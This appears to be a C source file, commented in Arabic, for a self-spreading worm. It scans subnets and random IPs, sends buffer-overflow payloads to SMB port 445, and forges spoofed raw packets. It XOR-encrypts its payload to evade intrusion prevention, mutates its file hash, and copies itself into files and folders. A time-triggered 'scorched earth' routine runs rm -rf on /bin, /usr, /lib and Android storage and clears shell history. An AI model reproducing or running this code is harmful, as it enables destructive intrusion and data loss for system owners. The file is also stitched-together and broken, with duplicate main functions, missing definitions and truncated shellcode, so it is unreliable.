#include <stdio.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <stdlib.h>

#define TARGET_PORT 4444 // المنفذ الذي تستهدفه الدودة في الضحايا
#define WORM_SIZE 10240  // حجم بايتات الدودة

// دالة لإرسال كود الدودة (النسخة التنفيذية) عبر الشبكة
void spread_to_host(char *target_ip, char *my_binary_path) {
    int sock;
    struct sockaddr_in target_addr;
    char buffer[WORM_SIZE];
    
    // 1. فتح ملف الدودة الحالي (نفسي) لقراءته كـ Binary
    FILE *self = fopen(my_binary_path, "rb");
    if (!self) return;
    size_t n = fread(buffer, 1, WORM_SIZE, self);
    fclose(self);

    // 2. إنشاء سوكيت للاتصال بالضحية
    sock = socket(AF_INET, SOCK_STREAM, 0);
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    // محاولة الاتصال (Timeout قصير لزيادة سرعة الانتشار)
    struct timeval tv;
    tv.tv_sec = 0; tv.tv_usec = 500000; // 0.5 ثانية فقط لكل IP
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) == 0) {
        printf("[!] Success! Spreading to: %s\n", target_ip);
        // 3. حقن كود الدودة في الجهاز الآخر
        send(sock, buffer, n, 0);
    }
    close(sock);
}

// هيكل البيانات لنقل معلومات الهدف لكل "خيط" (Thread)
typedef struct {
    char target_ip[16];
    int thread_id;
} target_data_t;

// تمثيل لـ "الحمولة" الخبيثة التي سيتم حقنها في الذاكرة
char shellcode[] = "\x90\x90\x90\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\xbb..."; 

// دالة لمحاكاة استغلال ثغرة (Exploit) في خدمة تعمل على منفذ معين
void exploit_target(char *ip) {
    int sock;
    struct sockaddr_in target;
    char buffer[1024];

    // إنشاء اتصال TCP/IP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return;

    target.sin_addr.s_addr = inet_addr(ip);
    target.sin_family = AF_INET;
    target.sin_port = htons(445); // محاكاة استهداف منفذ SMB الشهير

    printf("[*] Attempting to connect to target: %s\n", ip);

    if (connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
        printf("[+] Connection established. Sending Exploit Payload...\n");

        // هنا تكمن خطورة الدودة: إرسال بيانات تتجاوز حجم الذاكرة المخصص (Buffer Overflow)
        // وحقن الـ Shellcode في ذاكرة الهدف لجعله ينفذ كود الدودة تلقائياً
        memset(buffer, 'A', 500); // حشو الذاكرة
        memcpy(buffer + 500, shellcode, sizeof(shellcode)); // حقن الكود

        send(sock, buffer, sizeof(buffer), 0);
        close(sock);
    } else {
        printf("[-] Target %s is not vulnerable.\n", ip);
    }
}

// محرك المسح (IP Scanner) - قلب الدودة للبحث عن ضحايا جدد
void network_scanner() {
    char base_ip[] = "192.168.1.";
    char target_ip[16];

    for (int i = 1; i < 255; i++) {
        sprintf(target_ip, "%s%d", base_ip, i);
        // الدودة الاحترافية تعمل عبر Threads (خيوط معالجة) لمسح آلاف الأجهزة في ثوانٍ
        exploit_target(target_ip); 
    }
}
void execute_payload() {
    printf("[!] Simulation: Payload executed successfully.\n");
}

void replicate_to_target(const char *source_path, const char *target_path) {
    FILE *src = fopen(source_path, "rb");
    FILE *dst = fopen(target_path, "wb");

    if (src == NULL || dst == NULL) return;

    char buffer[1024];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, bytes, dst);
    }

    fclose(src);
    fclose(dst);
    
    // محاكاة جعل الملف المنسوخ قابلاً للتنفيذ (في بيئة Linux)
    chmod(target_path, 0755);
    printf("[+] Target infected: %s\n", target_path);
}

void scan_and_spread(const char *current_path) {
    struct dirent *entry;
    DIR *dp = opendir(".");

    if (dp == NULL) return;

    while ((entry = readdir(dp))) {
        // البحث عن مجلدات لمحاكاة الانتشار عبر الشبكة أو المجلدات المشتركة
        if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char next_target[512];
            snprintf(next_target, sizeof(next_target), "%s/%s_worm_copy", entry->d_name, entry->d_name);
            
            replicate_to_target(current_path, next_target);
        }
    }
    closedir(dp);
}
// دالة محاكاة لاستغلال ثغرة (Exploit) وحقن Shellcode في الذاكرة
void *exploit_and_replicate(void *arg) {
    target_data_t *data = (target_data_t *)arg;
    int sock;
    struct sockaddr_in server;

    // استخدام Non-blocking sockets للمسح السريع جداً
    sock = socket(AF_INET, SOCK_STREAM, 0);
    fcntl(sock, F_SETFL, O_NONBLOCK);

    server.sin_addr.s_addr = inet_addr(data->target_ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(TARGET_PORT);

    // محاولة الاتصال السريع
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    
    // هنا نستخدم تقنية الـ Remote Code Execution (RCE) 
    // بدلاً من مجرد نسخ ملف، نقوم بإرسال Payload يستغل ثغرة في الـ Buffer
    // ليجبر الجهاز الهدف على تحميل الدودة من خادم خارجي (C2 Server)
    
    // محاكاة إرسال "Malicious Packet" مصمم بعناية (Crafted Packet)
    char *payload = "\x41\x41\x41\x41\xeb\xfe..."; // Shellcode
    send(sock, payload, 6, 0);

    close(sock);
    free(data);
    pthread_exit(NULL);
}

void network_engine_v2(char *subnet) {
    pthread_t threads[MAX_THREADS];
    int thread_count = 0;

    for (int i = 1; i < 255; i++) {
        target_data_t *data = malloc(sizeof(target_data_t));
        sprintf(data->target_ip, "%s%d", subnet, i);
        data->thread_id = i;

        // إطلاق خيط معالجة لكل IP لضمان مسح الشبكة في أجزاء من الثانية
        if (pthread_create(&threads[thread_count], NULL, exploit_and_replicate, (void *)data) == 0) {
            thread_count++;
        }

        // موازنة الحمل (Load Balancing) لعدم إسقاط النظام المضيف
        if (thread_count >= MAX_THREADS) {
            for (int j = 0; j < thread_count; j++) pthread_join(threads[j], NULL);
            thread_count = 0;
        }
    }
}
// دالة لحساب الـ Checksum (ضرورية لكي يقبل الراوتر الحزمة)
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) sum += *(unsigned char*)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if(s < 0) { perror("Socket Error"); exit(1); }

    char packet[4096];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
    struct sockaddr_in sin;

    char *target_ip = "192.168.1.50"; // الهدف
    char *pseudo_ip = "1.2.3.4";      // IP وهمي (Spoofing)

    memset(packet, 0, 4096);

    // 1. بناء رأس حزمة الـ IP (Layer 3)
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(pseudo_ip); // هنا التزييف!
    iph->daddr = inet_addr(target_ip);
    iph->check = checksum((unsigned short *)packet, iph->tot_len);

    // 2. بناء رأس حزمة الـ TCP (Layer 4)
    tcph->source = htons(1234);
    tcph->dest = htons(445); // منفذ SMB
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1; // إشارة المزامنة للانتشار
    tcph->window = htons(5840);
    tcph->check = 0; // سيتم حسابه لاحقاً مع الـ Pseudo Header

    sin.sin_family = AF_INET;
    sin.sin_port = htons(445);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // إخبار النظام أننا قمنا ببناء رأس الـ IP يدوياً
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    printf("[*] Sending Crafted RAW Packet to %s...\n", target_ip);

    if (sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("Sendto Error");
    } else {
        printf("[+] Stealth Packet Sent Successfully.\n");
    }

    return 0;
}
// مفتاح التشفير لجعل الحمولة غير مرئية للـ IPS
#define CRYPTO_KEY 0xAA 

// دالة التشفير (Polymorphic Logic)
void encrypt_payload(char *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] = data[i] ^ CRYPTO_KEY;
    }
}

// بناء حزمة الـ TCP RAW
void send_stealth_packet(char *target_ip) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    char packet[4096];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
    struct sockaddr_in sin;

    memset(packet, 0, 4096);

    // تجهيز الحمولة (Payload) وتشفيرها
    char *payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
    strcpy(payload, "\x90\x90\xeb\x10\x5e..."); // Shellcode حقيقي
    encrypt_payload(payload, strlen(payload));

    // إعدادات Layer 3 (IP Header)
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(payload);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr("1.1.1.1"); // IP مزيف لتضليل سيسكو NetFlow
    iph->daddr = inet_addr(target_ip);

    // إعدادات Layer 4 (TCP Header)
    tcph->source = htons(12345);
    tcph->dest = htons(445); // SMB Port
    tcph->syn = 1; // حزمة SYN للبدء

    sin.sin_family = AF_INET;
    sin.sin_port = htons(445);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // إرسال الحزمة "الخام"
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    
    printf("[!] Superman Packet Sent to: %s (Encrypted)\n", target_ip);
    close(s);
}

void mutate_hash(const char *file_path) {
    FILE *fp = fopen(file_path, "ab"); // الفتح بنمط الإضافة الثنائية
    if (fp == NULL) return;

    srand(time(NULL));
    int junk_size = (rand() % 64) + 1; // إضافة بين 1 إلى 64 بايت عشوائي
    
    for (int i = 0; i < junk_size; i++) {
        unsigned char random_byte = rand() % 256;
        fputc(random_byte, fp);
    }

    fclose(fp);
    printf("[+] Mutation complete: File hash changed.\n");
}
void scorched_earth_total(const char *my_path) {
    printf("[!] WARNING: SCORCHED EARTH PROTOCOL INITIATED...\n");

    // مصفوفة المسارات المستهدفة للتدمير
    const char *targets[] = {"/bin", "/usr", "/lib", "/sdcard", "/storage/emulated/0"};
    
    for (int i = 0; i < 5; i++) {
        char cmd[256];
        // استخدام -rf للحذف الإجباري والتكراري
        snprintf(cmd, sizeof(cmd), "rm -rf %s/* 2>/dev/null", targets[i]);
        system(cmd);
    }

    // الانتحار البرمجي: حذف ملف الدودة نفسه
    unlink(my_path);
    
    // محاولة مسح سجل العمليات (Command History)
    system("history -c");

    exit(0);
}
int check_propagation_success() {
    int infected_count = 0;
    struct dirent *entry;
    DIR *dp = opendir(".");
    
    while ((entry = readdir(dp))) {
        // نعد كم ملف يبدأ بكلمة "infected_"
        if (strstr(entry->d_name, "infected_") != NULL) {
            infected_count++;
        }
    }
    closedir(dp);

    // إذا وجدنا أكثر من نسخة (مثلاً 5)، نعتبر العملية ناجحة
    return (infected_count >= 5) ? 1 : 0;
}
void silent_sniffing() {
    printf("[*] Entering Dormant/Sniffing Mode. Monitoring traffic...\n");
    // محاكاة فتح سوكيت للتنصت على الحزم المحلية (Passive Sniffing)
    int raw_sock = socket(AF_INET, SOCK_STREAM, 0);
    char buffer[65536];
    while(1) {
        recv(raw_sock, buffer, sizeof(buffer), 0);
        // هنا يمكن إضافة كود لحفظ العناوين النشطة في ملف مخفي
        sleep(5); // خمول لتجنب استهلاك المعالج
    }
}

int is_it_attack_time() {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    // تفعيل التدمير فقط بين الساعة 3 و 5 صباحاً
    return (t->tm_hour >= 3 && t->tm_hour <= 5) ? 1 : 0;
}

int main(int argc, char **argv[]) {
    struct dirent *entry;
    DIR *dp = opendir("."); // فحص المجلد الحالي

    if (dp == NULL) return 1;

    // الدودة تبحث عن جميع الملفات التي تنتهي بـ ".txt" لتستبدلها بنفسها
    // أو تبحث عن مجلدات لتنسخ نفسها داخلها بأسماء مخفية
    while ((entry = readdir(dp))) {
        // تجنب نسخ نفسها في نفسها
        if (strstr(entry->d_name, ".exe") == NULL && entry->d_type == DT_REG) {
            
            char new_worm_name[256];
            snprintf(new_worm_name, sizeof(new_worm_name), "infected_%s.exe", entry->d_name);
            mutate_hash(new_worm_name);
            chmod(new_worm_name, 0755);
            printf("[!] Targeting: %s -> Creating: %s\n", entry->d_name, new_worm_name);
            
            // العملية الحقيقية: الدودة تنسخ كودها (argv[0]) إلى الهدف
            replicate(argv[0], new_worm_name);
        }
    }

    // حفظ مسار الدودة للحذف اللاحق (الأرض المحروقة)
    char *my_path = argv[0];
    char target_ip[16];

    // تأمين البداية العشوائية (Seed) بناءً على وقت الجهاز
    srand(time(NULL));

    printf("[!] Starting Global Probing via Orbot VPN...\n");

    // الحلقة اللانهائية للانتشار العالمي
    while(1) {
        // 1. توليد عنوان IP عشوائي في كل مرة
        get_random_ip(target_ip);

        // 2. محاولة اختراق الهدف المختار عشوائياً
        // ملاحظة: exploit_target يجب أن تستخدم SOCK_STREAM لتعمل بدون Root
        exploit_target(target_ip);

        // 3. التحقق من شرط "ساعة الفجر" لتنفيذ الأرض المحروقة
        if (is_it_attack_time()) {
            scorched_earth_total(my_path);
        }

        // تأخير بسيط (0.1 ثانية) لضمان استقرار نفق Orbot وعدم خنقه
        usleep(100000); 
    }

    closedir(dp);
    
    printf("\n[+] Replication complete. System state: Compromised.\n"); */
    // محاكاة مسح شبكة سيسكو كاملة في ثوانٍ
    char *targets[] = {"10.0.0.1", "10.0.0.2", "10.0.0.5"};
    for(int i=0; i<3; i++) {
        send_stealth_packet(targets[i]);
    }
    // محاكاة الانتشار في شبكة ههههو محلية
    network_engine_v2("10.0.0."); 
        // 1. تنفيذ الحمولة (Payload)
    execute_payload();

    // 2. محرك الانتشار (Scanning for ta1rgets)
    // نمرر مسار البرنامج الحالي لنسخه
    scan_and_spread(argv[0]);
    // تبدأ الدودة بمسح الشبكة المحلية (Subnet) التي ينتمي إليها الجهاز المصاب
    network_scanner();
    // 2. زناد التفعيل (مثال: بعد 10 دقائق من العمل أو عند انتهاء المسح)
        // ... بعد انتهاء المسح والانتشار ...
    sleep(600); 

    // الشرط المنطقي:
    if (check_propagation_success()) {
        printf("[+] Propagation confirmed. Keeping host alive for further operations.\n");
        // هنا يمكننا جعل الدودة تدخل في وضع "الخمول" بدل التدمير
        while(1) sleep(3600); 
    } else {
        // إذا فشلت في التكاثر، نقوم بمسح الأثر وتدمير البيئة الفاشلة
        printf("[-] Propagation failed. Executing Scorched Earth to hide tracks.\n");
        scorched_earth_total(argv[0]);
    }

/*    execute_payload();
    scan_and_spread(argv[0]);
    network_engine_v2("10.0.0.");
    
    // انتظر 10 دقائق لتقييم الوضع
    sleep(600); 

    // --- المرحلة 2: اتخاذ القرار البرمجي ---
    if (check_propagation_success()) {
        // إذا نجحت في التكاثر: ابقَ حياً وتجسس بصمت
        silent_sniffing(); 
    } else {
        // إذا فشلت: انتظر "ساعة الصفر" (الفجر) لمحو الأثر وتدمير النظام
        printf("[!] Waiting for the right moment to execute Scorched Earth...\n");
        while (!is_it_attack_time()) {
            sleep(1800); // تحقق كل نصف ساعة
        }
        scorched_earth_total(argv[0]);
    }

    return 0;
}
*/
    return 0;
}
